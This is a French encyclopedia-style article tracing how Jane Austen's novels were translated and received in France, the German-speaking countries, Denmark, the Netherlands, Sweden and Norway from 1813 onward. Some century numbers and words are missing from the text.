La traduction des six romans de Jane Austen de l'anglais vers le français a suivi assez rapidement leur parution originale en Grande-Bretagne, mais il a fallu attendre plusieurs années, voire le milieu du , pour trouver des traductions en d'autres langues en Europe.
La première traduction (anonyme) est une version française abrégée de "Pride and Prejudice" pour la "Bibliothèque Britannique" de Genève dès 1813, suivie par des éditions intégrales en 1821 et 1822. Les autres romans furent aussi traduits en français peu après leur parution : 1815 pour la traduction de "Sense and Sensibility" par Isabelle de Montolieu, 1816 pour celles de "Mansfield Park" et d"Emma". Les deux romans posthumes, "Persuasion" et "Northanger Abbey", furent traduits, respectivement, en 1821 en 1824.
Il y eut ensuite, au cours du , quelques traductions isolées en d'autres langues : en allemand pour ' (1822) et ' (1830), en suédois pour ' (1836) et "Emma" (1857), en portugais pour ' (1847), en danois pour " (1855-1856).
Mais c'est au cours du , d'abord à la fin de la deuxième guerre mondiale, puis, à partir des années 1990 en « exploitation opportuniste » du succès des adaptations cinématographiques inspirées par ses romans, que se multiplient les traductions des œuvres de Jane Austen. C'est ", suivi d"Emma", qui bénéficie partout du plus grand nombre de traductions.
Cependant, la distribution de ces ouvrages ne fut pas uniforme et Jane Austen est restée longtemps mal connue dans les pays de l'Est : la première traduction en russe ne date que de 1967.
Considérée de longue date dans les pays anglophones comme un auteur de première importance, la romancière ne fut pas réellement intégrée dans la tradition du « roman anglais » par le public continental qui n'y accède qu'à travers les traductions. Il n'est donc pas conscient du rôle fondateur que Jane Austen a joué dans l’avènement du roman britannique moderne, d'autant plus que les nuances de sa langue, l'acuité de son style, son écriture réaliste, la profondeur de sa réflexion sont ignorées des éditions « grand public ». La raison est à chercher dans les modifications introduites par les premiers traducteurs qui n'ont pas hésité à y injecter du sentimentalisme et à en éliminer tout l'humour et l'ironie. Les traductions du et du début du en général la tirent vers la littérature morale et didactique ou en font un écrivain pour « dames et demoiselles ». Les lecteurs européens ont eu de ce fait tendance à associer le style de Walter Scott à celui du roman britannique typique et à ranger l'œuvre de Jane Austen dans la littérature sentimentale, d'autant plus que, publiée anonymement, elle était éclipsée par d'autres romancières de langue anglaise de son époque, dont plusieurs avaient une notoriété certaine : Ann Radcliffe, Maria Edgeworth, Fanny Burney, Lady Morgan. Ce n'est que dans les années 1990, avec la diffusion généralisée d'adaptations cinématographiques et télévisuelles que l'intérêt pour l'œuvre de Jane Austen est devenu un engouement, entraînant une accélération dans la parution de traductions nouvelles, de plus en plus exactes, et dans un nombre de langues de plus en plus vaste.
Traductions en français.
C'est en français qu'ont paru les premières traductions des romans de Jane Austen, mais elles les transforment en romans sentimentaux à la française, d'où le malentendu durable concernant la romancière anglaise. Paraissant relever de la tradition sentimentale, ses ouvrages ont été considérés avec condescendance et sa réputation demeure encore brouillée en France. Si elle n'a pas encore complètement accédé au statut de « véritable » auteur littéraire au début du , l'édition de son œuvre dans la Bibliothèque de La Pléiade est le signe que son statut est en train changer.
Traductions du.
Après la période révolutionnaire, les romans étrangers sont l'objet d'un engouement dû à la nouveauté.
Aussi, dès l'été 1813, sont traduits à Genève, pour "La Bibliothèque britannique", de larges extraits de "", puis en 1814 de "Mansfield Park" .
En 1815, la baronne de Montolieu, femme de lettres vaudoise connue, « traduit librement » "", « enrichissant » pour son public la sobre élégance du style de Jane Austen avec des détails et un dénouement de son cru. "Raison et Sensibilité, ou les Deux Manières d'aimer" est un roman d'amour rempli de bons sentiments d'où sont gommés l'humour et l'ironie de l'œuvre originale.
En , à peine quelques mois après sa parution en Angleterre, sort la première traduction (anonyme) d"Emma", titrée "La Nouvelle Emma ou les Caractères anglais du siècle".
"Mansfield Park" est traduit la même année par Henri Villemain sous le titre "Le Parc de Mansfield, ou les Trois Cousines".
En 1821 Isabelle de Montolieu traduit « librement » "Persuasion". Elle change le titre en "La Famille Elliot, ou l'Ancienne Inclination", le nom de l'héroïne et ajoute, à son habitude, des éléments romanesques et de la sentimentalité.
En 1823 sort à Paris la première traduction intégrale de "Pride and Prejudice", titrée "Orgueil et Prévention". Une traduction plus conventionnelle sort en Suisse la même année et l'année suivante parait la première traduction de "Northanger Abbey", précédée de la traduction de la notice biographique de Henry Austen.
Jane Austen tombe ensuite complètement dans l'oubli pendant une cinquantaine d'années, puis bénéficie d'un léger regain d'intérêt en 1882, lorsque Bentley sort une nouvelle édition de ses romans. Une traduction de "Persuasion" parait alors chez Hachette, puis, en 1898, paraît en feuilleton dans "La Revue blanche" une nouvelle traduction de "Northanger Abbey" par Félix Fénéon, intitulée "Catherine Morland", ouvrage, fréquemment rééditée tout au long du , puisque "Northanger Abbey" ne sera traduit à nouveau qu'en 1980.
Traductions du.
Ces traductions présentent, à des degrés divers, les mêmes défauts que les précédentes : élagage et approximations.
Une traduction d"Emma" par Pierre de Puligua parait en feuilleton dans le "Journal des Débats politiques et littéraires" en 1910.
Deux traductions paraissent durant l'entre-deux guerres : en 1932, "Les Cinq Filles de Mrs. Bennet", de Valentine Leconte et Charlotte Pressoir dont le titre, en mettant l'accent sur le personnage de Mrs Bennet, inscrit cette traduction dans les ouvrages destinés à une clientèle féminine ;
et en 1933 une "Emma" par P. et É. de Saint Second.
La littérature anglophone ayant été censurée dans les pays occupés pendant la guerre, l'année 1945 voit exploser les traductions :
Ensuite il n'y aura plus que quelques traductions grand public de "", jusqu'à ce que, dans le dernier quart du , Christian Bourgois ajoute Jane Austen à son catalogue de littérature étrangère, la mettant ainsi à la portée d'un vaste public cultivé. Les textes d'accompagnement et de nouvelles traductions de qualité vont progressivement transformer la réception de Jane Austen en France.
Mais ce sont les adaptations cinématographiques qui ont vraiment révélé Jane Austen au grand public, tout en entretenant le malentendu, puisqu'elles présentent un romantisme absent des romans sources. Elles ont entraîné un intérêt pour l'auteur et son œuvre, d'où une vague de rééditions « opportunistes » de traductions anciennes de plus ou moins bonne qualité dans diverses collections bon marché, et quelques rares traductions nouvelles.
Les illustrations de couverture des éditions de poche, tournant toutes autour du thème de la jeune fille rêveuse et féminine, continuent aussi à véhiculer l'image stéréotypée d'un auteur de « romans féminins » et sentimentaux, même si le paratexte tend désormais de plus en plus à valoriser la qualité de l'œuvre.
Les traductions du.
La prolifération des traductions disponibles contribue à brouiller la réception de Jane Austen, les éditions grand public la tirant toujours du côté du roman sentimental, alors que ceux qui la lisent en anglais prennent la pleine mesure de sa complexité et de sa subtilité.
Aussi l'édition de ses romans dans la Bibliothèque de la Pléiade est-elle une forme de consécration qui devrait permettre . Le premier volume sorti en 2000 contient les œuvres de jeunesse, le deuxième, paru en 2013, les romans de la maturité.
De nouvelles traductions, plus fidèles au texte original et respectueuses de son découpage, paraissent aussi dans les collections de poche « classiques », accompagnées en général d'un paratexte conséquent signé par des universitaires, dont quatre pour le seul "" : celles de Béatrice Vierne en 2001, de Pierre Goubert en 2007, de Laurent Bury en 2009 et de Sophie Chiari en 2011.
Gallimard sort en Folio classique, en 2009 "Le Cœur et la Raison" (paru en Pléiade en 2000), en 2011 une nouvelle traduction de "Persuasion", en 2014 "Mansfield Park" (paru en Pléiade en 2013).
Bien que la popularité de Jane Austen en France reste liée à l'image romanesque véhiculée par les adaptations, les traducteurs s'attachent désormais à mieux rendre son ironie, l'acuité de son style et la finesse de ses observations.
Traductions dans les langues germaniques.
Un recensement de l'ensemble des traductions de Jane Austen a été fait par David Gilson dans un ouvrage dont la première édition remonte à 1982.
Il constate que la date de première parution d'une traduction, le choix et le nombre des romans traduits sont très variables selon les pays. Ainsi, au , il n'existe des traductions qu'en trois langues en plus du français : en allemand pour ' (1822) et ' (1830), en suédois pour ' (1836) et "Emma" (1957-1958) et en danois, en 1855-1856, pour '. Mais on la lisait aussi en version originale, puisque Bentley la co-édite avec l'éditeur parisien Galignani en 1833 et que Tauchnitz l'édite en Allemagne entre 1864 et 1877 ; voire en français, comme aux Pays-Bas ou en Hongrie. Le premier traducteur allemand et le premier traducteur danois étant eux-mêmes des gens de lettres, comme de Montolieu et plus tard Félix Fénéon pour le français, leur goût personnel a pu influencer leur choix.
Traductions en allemand.
Jane Austen ne suscite que peu d'intérêt en Allemagne avant 1948, alors que Walter Scott est particulièrement apprécié. Ensuite, pendant la durée de la partition (1949-1990), la réception de son œuvre est différente en République démocratique allemande (RDA), où l'on souligne volontiers son réalisme et son ironie envers une société de classe « capitaliste », et en République fédérale d'Allemagne (RFA), où l'on s'intéresse plus à ses qualités littéraires « intemporelles ». Depuis la réunification, elle bénéficie d'un statut proche de celui qu'elle connait en Grande-Bretagne. Comme pour celles en français, la plupart des traductions en allemand et les comptes-rendus de ces traductions rangent Jane Austen plutôt parmi les écrivains sentimentaux, en particulier les romancières romantiques tardives. En général, elles manquent de nuances, sont parfois réductrices, mais .
Jusqu'en 1948.
Le premier roman traduit est '. L'écrivain Wilhelm Adolf Linau, peut-être incité par le compte rendu qu'en fait la "Quarterly Review", dont il est un lecteur assidu, et la parution en 1821 de la traduction de Montolieu, publie en 1822 ' ("Anna : portrait d'une famille"). C'est une traduction intégrale, quasi mot-à-mot, excellente selon les standards de l'époque, discrètement germanisée : Anne devient Anna, Frederick devient Friedrich, Charles Musgrove est écrit Karl.
' bénéficie d'une première traduction en 1830, ' , mais il n'y a pas d'autre traduction d'œuvres de Jane Austen au . La traductrice, Louise Marezoll, prend des libertés avec l'original, résume de nombreux dialogues, fait de la paraphrase. Elle ne s'intéresse qu'à l'histoire d'amour ; les sentiments sont intensifiés, l'ironie disparaît. Ces deux traductions ne sont pas rééditées, mais, à partir de 1864, Bernhard Tauchnitz commence à Leipzig la publication des six romans de Jane Austen. Après ', il publie ' (1867), puis ' (1870) , ' et ' (1871) et termine par "Emma" en 1877.
Bien que Jane Austen soit l'objet d'analyses universitaires et même d'une thèse de doctorat en 1910, une seule traduction paraît, en 1939, à Berlin. Cette traduction isolée de ', due à Karin von Schwab et titrée ' est loin d'être fidèle. La traductrice tente d'actualiser le roman et use d'un langage plutôt familier Elle sera rééditée en 2007 par les éditions Anaconda.
Au sortir de la guerre, les Allemands sont en demande d'auteurs étrangers et les traductions se multiplient. En 1948 paraissent quatre traductions, dont deux de ' : l'une est suisse, ' , par Ilse Krämer, éditée à Zurich, l'autre paraît à Cologne, qui se trouve dans la zone occupée par les Britanniques, ' de Margarethe Rauchenberger (réimprimée en 1985). Margarethe Rauchenberger traduit la même année ', sous le titre "Anne Elliot" et ' ('), préfacé par Daphne du Maurier, qui sera réimprimée en 1983 à Francfort avec des illustrations de Hugh Thomson.
Ces traductions, faites à la va-vite, imprimées sur mauvais papier, contiennent des erreurs et des omissions, mais seront régulièrement rééditées quand Jane Austen sera devenue populaire.
1949-1990.
La partition de l'Allemagne en 1949, va entraîner un traitement différent de l'œuvre austenienne dans les deux Allemagnes.
En RDA.
À l'Est, où l'on accorde une grande importance à la littérature pour son rôle dans l'éducation, on considère le réalisme du comme une sorte de préfiguration de la prose communiste et l'émancipation de la femme attire l'intérêt sur les œuvres des romancières, ce qui est plutôt favorable à Jane Austen. D'ailleurs Georg Lukács, dans son essai "Le Roman historique", la fait entrer parmi les auteurs du roman réaliste classique du , en compagnie de Walter Scott, de Balzac et de Tolstoï. Mais le filtre de la censure et la pénurie de papier entraînent des éditions plus rares et tirées à un plus petit nombre d'exemplaires qu'à l'Ouest.
', traduction de ' par Werner Beyer, est édité à Leipzig en 1965 et "Emma", dans la traduction de Horst Höckendorf l'est à Berlin et Weimar, la même année ; la traduction de ' (') par Erika Gröger paraît à Berlin et Weimar en 1972, celle de ' (') de Christiane Agricola à Leipzich en 1980 et celle de "Mansfield Park" par Margit Meyer à Berlin et Weimar en 1989. Ces traductions maintes fois rééditées (ce qui dispense de subir la censure) ne sont généralement pas diffusées en RFA. Une exception cependant, liée à la notoriété grandissante de Jane Austen à l'Ouest : les traductions de Werner Beyer et Erika Gröger sont reprises en 1980 pour la première et 1982 pour la seconde par Fischer Verlag, gros éditeur de Francfort-sur-le-Main, et VMA-Verlag édite la traduction de Christiane Agricola en 1980, l'année même de sa sortie à l'Est.
En RFA.
La quatrième traduction de "", par Helmut Holscher, paraît en 1951, suivie d'une "Emma" par Helene Henze en 1961. Elles semblent avoir eu peu de succès puisqu'elles ne seront pas rééditées.
Contrairement à l'Allemagne de l'Est où les traductions sont planifiées, l'Ouest applique la loi du marché.
1977 marque un tournant et peut être considéré comme le point de départ de la popularité de Jane Austen à l'Ouest. Ursula et Christian Grawe, qui ont découvert ses romans aux États-Unis, peu satisfaits des rares traductions accessibles, proposent à Reclam-Verlag, éditeur à Stuttgart, leur traduction de '. À la suite du succès de ' (qui sera très régulièrement réimprimé, en 1981, 1984, 1992, 1996, 2000, 2007), l'éditeur leur confie la traduction de l'intégralité des romans de Jane Austen, puis de celle de sa correspondance et de ses écrits de jeunesse. Toutes ces traductions, qui s'échelonnent le long des années 1980, sont de qualité et bénéficient d'un important apparat critique (notes et postface) de Christian Grawe. Pour ', en 1981, les Grawe préfèrent germaniser le titre, mais en utilisant ' (monastère) plutôt que "" (abbaye), alors que les traductions plus récentes, celle d'Andrea Ott, parue à Zurich en 2008, comme celle de Sabine Roth sortie à Munich en collection de poche en 2012 gardent le titre anglais.
Leur traduction d"Emma" paraît à Stuttgart en 1980, celle de "Persuasion" ("") en 1983, celle de "Mansfield Park", la première de ce roman en allemand, en 1984.
Après la réunification.
Le système où l'État gérait la culture disparaissant, les maisons d'édition de l'Est ferment ou sont privatisées et les produits littéraires soumis à la loi du marché, mais la popularité de Jane Austen continue de croître : se succèdent nouvelles traductions (19 entre 1990 et 2002) et rééditions des traductions originaires de l'Est comme de l'Ouest (plus d'une soixantaine), illustrées ou non, dans toutes sortes de formats et de prix. Le succès des adaptations des années 1995-1996 en est la raison essentielle, ce sont d'ailleurs ', puis ' et "Emma" qui bénéficient du plus grand nombre de nouvelles éditions.
Ainsi, 1997 voit paraître à Munich le premier opus d'une nouvelle série de traductions en édition de poche, qui débute avec la traduction de ' par Helga Schulz qui traduira progressivement d'autres romans pour le même éditeur : ' en 2000, "Mansfield Park" en 2002, "Emma" en 2013. Sabine Roth, qui traduit "Persuasion" en 2010, choisit un titre plus développé "" ("Anne Elliot ou le pouvoir de la persuasion").
En Suisse.
En Suisse alémanique aussi paraissent des traductions de Jane Austen depuis le milieu du . Outre la traduction déjà citée de ' (') par Ilse Krämer en 1948, on peut noter "Emma" traduit par Ilse Leisi, paru à Zurich, chez Manesse Verlag en 1981, avec une postface de Max Wilde, suivie de celle de ' ("), par Ruth Schirmer en 1984.
L'usage de confier la traduction de plusieurs romans à la même personne est plus récent : Andrea Ott traduit pour Manesse Verlag ' en 2003, ' en 2005, " en 2008.
Traductions en danois.
La première référence à Jane Austen se trouve dans un article anonyme paru en 1826, où elle est citée parmi d'autres écrivains britanniques, Ann Radcliffe, Charles Robert Maturin, les sœurs Porter, Maria Edgeworth, Elizabeth Inchbald, Walter Scott. La situation du Danemark pendant les guerres napoléoniennes - bataille de Copenhague en 1801, bombardement meurtrier de 1807 (qui fit victimes et détruisit la Cathédrale Notre-Dame), perte de la Norvège (traité de Kiel, ) entérinée au Congrès de Vienne - explique l'animosité des Danois envers les Anglais, partant, leur peu d'intérêt pour la littérature britannique en général. En outre, la référence culturelle des Danois cultivés était alors la culture allemande et leur goût les portait vers la littérature sentimentale et les romans d'évasion hauts en couleur, ceux de Fenimore Cooper, de Walter Scott ou d'Edward Bulwer-Lytton.
Avant 1945.
Le premier roman de Jane Austen paru en danois, en 1855-1856, est la traduction de ' par Carl Karup, titrée ' (Compréhension et cœur). Cet excentrique touche-à-tout (1829-1870) et son éditeur, Ludvig Jordan (1813-1889), ont probablement choisi ce roman de Jane Austen parce qu'il correspondait le mieux aux tendances de la littérature populaire de l'époque. Carl Friedrich Wilhelm Ignatius Karup est un traducteur minutieux, qui possède une assez bonne connaissance de l'arrière plan culturel du roman (transmission de l'héritage, gestion d'un domaine ou vogue du "picturesque"), même s'il n'a pas compris, par exemple, que l’' de Barton Cottage implique non un simple agrandissement (sens de ', le terme qu'il choisit) mais une amélioration esthétique. Mais cette traduction n'a jamais été rééditée : Jane Austen devra attendre l'accroissement de sa notoriété à la suite de la publication d"A Memoir of Jane Austen" (1870-1871) pour intéresser les universitaires danois.
C'est Ebba Brusendorff (1901-1935), seconde épouse du titulaire de la chaire d'anglais à l'université de Copenhague, qui se charge de la première traduction de ' (') en 1928-1930. Bien qu'elle se veuille fidèle à l'original, elle procède à certains changements : censurant l' et son penchant à , elle condense, résume, voire supprime des passages.
À la fin de la guerre.
Mais la libération du Danemark en par les troupes de Montgomery, donne naissance à une forte vague d'anglophilie dont vont s'emparer ceux qui voient dans l'« anglicité » ("") un modèle absolu. La traduction de romans britanniques connait alors une inflation sans précédent, avec une déférence particulière envers les grands auteurs, dont Jane Austen fait partie. édite même une traduction de "Lady Susan", par (1908-1978), avec des illustrations de Des Asmussen, dont la préface présente la romancière comme .
L'exemple le plus évident de cette dévotion est la traduction d"Emma" par Johanne Kastor Hansen (1879-1974) en 1958. Présentant ce roman paru en 1815 comme à une époque où il est menacé, et Mr Knightley comme l'archétype de l'Anglais, posé et sérieux, par opposition au désinvolte Franck Churchill, la traductrice, en admiratrice éperdue, choisit de rester au plus près du texte, le traduisant de façon si littérale, voire servile, qu'elle en arrive à le dénaturer.
La nouvelle traduction de ' par Lilian Plon en 1952 est plus réussie. Cette traductrice chevronnée transcrit l'anglais de Jane Austen dans un danois vif et naturel, loin de la langue compassée des traductions précédentes. Elle utilise des expressions courantes, des tournures idiomatiques, remplace le « ' » cérémonieux par un « ' » plus familier dans les dialogues des derniers chapitres entre Darcy et Elizabeth, transpose en couronnes le montant des fortunes et utilise une courte périphrase explicative pour traduire le concept, inconnu au Danemark, d"entail". Pour l'universitaire danois Peter Mortensen ces altérations, mineures, rendent sa traduction très lisible, encore aujourd'hui. Elle et son ' , régulièrement réimprimée (en 1962, 1970, 1976, 1988, 1996, 2000) et sortie en livre audio en 2012.
Paraissent ensuite, au milieu des années 1970, au moment de l'émergence du féminisme au Danemark, les traductions, par trois femmes, des cinq autres romans : en 1974, deuxième traduction de ', sous le titre ' (« Raison et sensibilité »), par Eva Hemmer Hansen et traduction de "Mansfield Park" par Johanne Kastor Hansen ; en 1975, traduction de "Persuasion" par Eva Hemmer Hansen et de "Northanger Abbey" ("") par Louise Pihl, qui, en 1978, traduit aussi "Emma", illustrée par Svend Otto S.
Les traductions fluides d'Eva Hemmer Hansen (1913-1983) se remarquent par leur aspect « ontologique », c'est-à-dire où le traducteur-écrivain transparaît : elle rend avec succès l'esprit des romans, mais utilise des expressions modernes, un vocabulaire familier, s'affranchit de la syntaxe anglaise, choisit pour sa traduction de "Persuasion" le titre ' (« Amour et faiblesse »). Mais les éditions récentes, comme celle parue en 2012 chez Bechs Forlag - Viatone, seront titrées ' (« Persuasion »).
Le tournant des années 1990.
Dans les années 1995-1999, la vague d’"austenmania" provoquée par la sortie de quatre versions filmées, à tendances romantiques et sentimentales, ', "Persuasion", "Emma", "Mansfield Park", toutes présentées en versions originales dans les principaux cinémas danois, entraîne la réédition répétée des traductions existantes. L'éditeur profite alors de l'engouement du grand public pour acheter les droits des traductions existantes de ', "Persuasion" et "Emma", et les publier dans des éditions populaires et bon marché, à destination d'un public jeune, majoritairement féminin, avec, en première de couverture, la photo des acteurs.
Certains intellectuels, qui mènent un rude combat pour (re)donner aux Danois le goût de leurs propres écrivains, comme Hans Christian Andersen, s'inquiètent de l'envahissement du Danemark par une culture anglo-saxonne omniprésente, parlent d'impérialisme linguistique et de perte d'identité culturelle : Peter Mortensen a d'ailleurs intitulé son essai sur l'accueil de Jane Austen au Danemark ' (Capitulation inconditionnelle ?). Mais il considère que les traductions d'Eva Hemmer Hansen, fidèles dans le fond mais irrespectueuses dans la forme, car écrites dans un danois résolument moderne, sont un exemple de résistance à l'invasion des anglicismes et de la culture américaine. Et même si on lit Jane Austen en anglais au Danemark, on continue à la traduire en danois : ainsi paraissent chez Lindhardt &amp; Ringhof de nouvelles traductions de "" en 2006 et "Emma" en 2013 par Vibeke Houstrup.
Traductions en néerlandais.
Jusqu'en 1980.
Aucune traduction n'est faite au , ni aux Pays-Bas où Jane Austen peut être lue en français voire en anglais par la classe cultivée, ni en Belgique néerlandophone, dont les élites parlent français.
La première traduction est celle de ' en 1922, par Gonne van Uildriks, sous le titre inversé ' (« Sentiment et bon sens »), qui sera souvent rééditée, mais en versions « révisées et abrégées », jusque dans les années 1950 ; les traductions suivantes porteront divers titres : ' (« Tête d'une fille et cœur d'une fille ») en 1954, ' (« Raison et sentiment ») en 1971, ' (« Bon sens et irréflexion ») en 1982, ' (« Raison et sentiment ») en 1994, ce qui peut indiquer dans quel sens s'oriente la traduction, partant, la réception par le public.
C'est ensuite le tour de ', publié en Belgique en 1946, traduit littéralement ' par Frans Verachtert, puis celui d"Emma " en 1949 par Johan Antoon Schröeder, publié conjointement à Amsterdam et Anvers. Une autre traduction de ' par Henrietta Van Praag-van Praag paraît en 1964, au titre plus thématique et réducteur : ' (« Les sœurs Bennet »). Mais Jane Austen est mieux reçue en français qu'en néerlandais : en 1945 les traductions de tous ses romans, sauf "Persuasion", étaient déjà éditées à Bruxelles.
"Persuasion" est finalement traduit en 1953 par Marie Pauline Brunt, sous le titre ' (« Le discernement tardif ») ; "Northanger Abbey" traduit en 1956 par Jean Jacob, devient ' (« Héroïne incontrôlable »). Tous deux insistent sur l'humour de Jane Austen, son sens aigu de l'observation et son art du dialogue, mais comme elle n'est pas étudiée dans le cursus universitaire aux Pays-Bas, contrairement à Samuel Richardson, son œuvre reste relativement méconnue, même si une ' (') est créée en 1976.
Depuis 1980.
Mais après 1980, l'intérêt pour Jane Austen augmente de façon significative : pas moins de douze traductions nouvelles et vingt-et-une rééditions entre 1980 et 2000.
"Emma".
"Emma", le roman de Jane Austen le plus populaire aux Pays-Bas, considéré par les spécialistes comme son chef-d'œuvre, bénéficie de rééditions de la traduction de Schröeder (1949), qui en est à sa huitième édition en 2005, et de nouvelles traductions, avec, parfois, des notes explicatives, une postface, une présentation de l'auteur dans le contexte, comme pour l’"Emma" de Carolien Polderman-de Vries (1980). En 1996, pas moins de quatre traductions d’"Emma" sont disponibles, dont deux nouvelles (celle d'Akkie de Jong chez Boek Werk et celle d'Annelies Roeleveld et Margret Stevens aux éditions Athenaeum-Polak &amp; van Gennep), visiblement liées à la sortie du film "Emma, l'entremetteuse", car Jane Austen est devenue un « produit commercial ».
Les autres romans.
Les éditions Spectrum éditent de nouvelles traductions de tous les romans sauf "Northanger Abbey" dans les années 1980, à la fois en éditions reliées et en livres de poche, avec une postface.
Outre l"Emma" de Carolien Polderman-de Vries, "Het Spectrum" édite les traductions de W. A. Dorsman-Vos : celle de "Pride and Prejudice" en 1980 (sous le titre ', « Malentendu et vanité »), de ' en 1982 (titré ', « Raison et déraison »), de "Mansfield Park" en 1984 et de "Persuasion" (') en 1987.
Les éditions Boek Werk présentent de nouvelles traductions dans les années 1990. Elke Meiborg traduit ', sous le titre désormais fixé de ' (« Raison et sentiment ») en 1994, "Persuasion" (titré ', « Conviction ») en 1996 et ' ("") en 1997 ; Ben Zuidema, "Mansfield Park" en 1997. La même année Sophie Brinkman et Maarten Spierdijk présentent la deuxième traduction de "Northanger Abbey" en néerlandais, qu'elles intitulent "Catherine". Peu fournies en paratexte, ces traductions s'adressent plutôt à un public populaire amené à l'œuvre austenienne par la télévision et le cinéma, car Jane Austen continue aussi à être lue en anglais.
Traductions dans les pays scandinaves.
Traductions en suédois.
Au.
Les seuls romans de Jane Austen traduits en suédois au sont "Persuasion", en 1836, sous le titre ' (« Famille Elliot, description de caractères anglais »), par Emilia Westdahl, suivi d'une traduction anonyme d"Emma", parue en 1857-1858 sous le titre ' (« Emma, ou le talent d'arranger des mariages pour ses amies »). Si le premier ouvrage est visiblement une traduction de "La Famille Elliot, ou l'Ancienne Inclination" d'Isabelle de Montolieu, qui, comme le texte français, contient des détails et des commentaires ajoutés, "Emma" est une traduction relativement fidèle de l'original. Mais elle contient des omissions et des raccourcis qui font d'Emma Woodhouse une héroïne beaucoup plus conventionnelle et de Mr Knighkley un mentor plus traditionnel. C'est qu'en Suède où l'on connaît les « dames-écrivains anglaises » ("") depuis au moins 1772, on apprécie le côté moralisant d'Eliza Haywood ou Maria Edgeworth dont les œuvres paraissent propres à préparer les jeunes filles à devenir de bonnes épouses, et les traductions s'efforcent de conformer Jane Austen à cette conception.
Alors que les romanciers anglais (en particulier Charles Dickens et Thackeray), sont très appréciés, vers le milieu du siècle, on commence à reprocher aux romancières (à part Charlotte Brontë), un manque d'intensité dramatique et une augmentation du sentimentalisme, traitant leurs ouvrages, avec une certaine condescendance, de ' (romans-thé à l'eau). Et même si la grande encyclopédie suédoise ('), à la fin du siècle, présente Jane Austen comme , il faut attendre 1920 pour voir traduit un autre de ses romans.
Depuis le.
C'est en 1920 que commence la traduction de tous les romans de Jane Austen en suédois, avec la traduction de ' par Carl Axel Ringenson. ' est publié par le grand éditeur Bonnier, qui continuera à publier toutes les suivantes. Révise en 1946 par , précédé d'une nouvelle préface, il sort chez l'éditeur d'ouvrages classiques et est rééditée dix fois entre 1953 et 2006.
D'autres romans suivront le même processus, une traduction suivie de nombreuses rééditions : en 1954, une nouvelle traduction de "Persuasion" par Jane Lundblad (1905-1986), titrée ', dont elle écrit la préface (Elle fera une nouvelle préface pour la réédition de 1981) ; en 1956, une traduction d"Emma" par , elle aussi parue chez en deux volumes, fréquemment rééditée en un ou deux volumes, puis chez en 1997 ; en 1959, la première traduction de ' ("") par Marie-Louise Elliott, avec une postface de Jane Lundblad qui souligne que c'est une œuvre de jeunesse.
Mais "Northanger Abbey" et "Mansfield Park" ne seront pas traduits avant les années 1990. La traduction de "Northanger Abbey" par en 1993, avec une préface de et celle de "Mansfield Park" par en 1997, de même que les nombreuses rééditions de la fin des années 1990, profitent visiblement de la popularité générée par l'avalanche d'adaptations visibles en salles et sur le petit écran (en VOST) à partir de ces années-là.
L'éditeur de livres de poche Månpocket, qui a publié ' en 1996, "Emma" en 1997, "Northanger Abbey" en 2001, reconnaît que Jane Austen se vend bien. Mais la traduction la plus éditée (celle de ') l'est deux fois moins que "Jane Eyre", et cinq fois moins que, forcément, "" ("La Légende de Gösta Berling") de Selma Lagerlöf.
Les traductions les plus récentes s'efforcent de rendre l'ironie de Jane Austen et sont, en général, accompagnées d'un commentaire.
La réédition de 2002 de "Northanger Abbey" est accompagnée d'une postface de Lisbeth Larsson, professeur d'études de genre en littérature à l'université de Göteborg.
Une nouvelle traduction d"Emma" par Rose-Marie Nielsen paraît en 2010 chez Bonniers, rééditée en 2011 et 2012.
Quant à ' ('), il bénéficie en 2011 d'une nouvelle traduction qui vaut à sa traductrice, , le prix de la traduction ("") 2011.
Cependant le monde universitaire, malgré l'existence d'une critique féministe, garde certains stéréotypes concernant la notion de « roman féminin » et les femmes de lettres. On classe encore parfois Jane Austen parmi les écrivains de l'époque victorienne, ou de la période romantique, tandis que la presse, dans la centaine d'articles et de comptes rendus critiques produits entre 1990 et 2003 considère en général Jane Austen comme un auteur « classique », mais on l'associe aussi au genre littéraire populaire de la romance, à une . Justement, en 2008, une traduction de "Persuasion", par Eva Wennbaum, est sorti à Stockholm chez Harlequin Classics.
Traductions en norvégien.
La Norvège est un pays jeune, qui n'est indépendant que depuis 1905, après avoir été soumis pendant des siècles au Danemark, en 1815. Mais, pays de marine marchande, elle a toujours été tournée vers le Royaume-Uni et la France quand le Danemark regardait vers l'Allemagne. Cependant Jane Austen y semble inconnue au : elle n'est même pas citée dans les encyclopédies. Seul un article consacré à « seize brillantes romancières anglaises », paru dans un journal du dimanche en 1858, la nomme, ainsi que ' et "Mansfield Park". Il existe pourtant une traduction de "Persuasion" parue en feuilleton quotidien de à janvier 1812 dans le journal du matin '. Mais le titre, "", suggère qu'il s'agit d'une traduction originale de "La Famille Elliot" d'Isabelle de Montolieu, qui s'appuie sur celle parue en Suède en 1836. Cette traduction n'a pas été reprise en volume (à la différence de celles d'Elizabeth Gaskell et de George Eliot), et il est possible qu'elle soit liée à la publication de "A Memoir of Jane Austen" l'année précédente.
Jusqu'en 1996, un seul roman traduit : "Pride and Prejudice".
Il n'y a pas d'autre traduction jusqu'en 1930, date d'une première traduction de ' par Alf Harbitz, titrée ' (« Elizabeth et ses sœurs »). La préface de ce beau livre richement illustré (par les gravures de C. E. Brock), présente le roman comme le meilleur livre jamais écrit pour des jeunes filles, par une jeune femme de vingt-deux ans. Cette image de Jane Austen écrivant ses chefs-d'œuvre dans sa jeunesse persiste encore en Norvège. C'est une traduction abrégée, simplifiée, édulcorée, avec de nombreux passages censurés, qui tend à réduire les émotions des personnages. Sont supprimées, par exemple, les réactions d'Elizabeth à Hunsford après le départ de Darcy, à Pemberley devant son portrait, et l'allusion de Mr Bennet à l'échec de son mariage. La phrase () est tronquée après "" (« Mon enfant, ne me fais pas de peine »).
Les traductions suivantes seront de moins en moins tronquées. Celle de 1947, par Lalli Knutsen, reprend le bon titre (' signifie « orgueil et préjugé »), mais contient des erreurs et des contre-sens. En outre, le vocabulaire est plus violent, moins nuancé que dans l'original : ainsi, quand Bingley trouve Elizabeth « ' », la traductrice la dit « "" » (sacrément jolie). Celle parue en 1970, mais probablement plus ancienne, car Eivind et Elisabeth Hauge étaient actives entre 1940 et 1960, est toujours disponible. Plate et très inégale, c'est une réécriture qui gomme tout l'humour et l'ironie de l'original et qui est, au mieux approximative, au pire infidèle voire erronée. Même si certains dialogues sont très bien rendus, il y a un abus de points d'exclamation, et probablement l'idée sous-jacente que Jane Austen est trop prolixe et que tailler dans ses phrases la rendra plus accessible aux nouveaux lecteurs. C'est pourtant la traduction la plus connue, bénéficiant d'une cinquième impression en 2000, avec une photographie tirée de l'adaptation de 1995 en première de couverture. Une quatrième traduction, intégrale, paraît enfin en 2003, celle de Merete Alfen.
